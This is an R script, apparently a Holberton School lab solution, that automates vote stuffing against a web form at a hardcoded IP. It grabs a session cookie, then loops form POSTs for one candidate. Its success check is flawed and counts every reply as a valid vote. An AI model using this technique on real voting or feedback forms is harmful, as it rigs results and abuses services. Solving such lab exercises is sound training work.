# ===---Description------------------------------------------------------------===
#   Solution for the Hodor Project, Level 1 by Julien Barbier.
#   Using a R Language script with httr library.
#   To run this file install R language and run:
#   $ R -f filename
#
#   by Alexandro de Oliveira, for Holberton School
# ===---------------------------------------------------------------------------===

library('httr')

url     <- "http://173.246.108.142/level1.php"
head    <- HEAD(url)            # Head request
cookie  <- cookies(head)$value
body    <- list(id = "23", holdthedoor = "submit", key = cookie)
header  <- add_headers("User-Agent" = "havk64 R Language Requests")
count   <- 1
total   <- as.integer(readline(prompt = "How many votes? => "))

while(count < total) {
    p <- POST(url, body = body, encode = "form", header)
    s <- content(p, "text", encoding = 'UTF8')[1]
    match = grep("I voted!", s, perl=TRUE, value=FALSE) # Regexp to check of vote is valid.
    if(!is.null(match)) {
        cat(".")
	count <- count + 1
    } else {
        cat("x")
    }
}
cat('\n', "Total valid votes is: ", total, '\n')

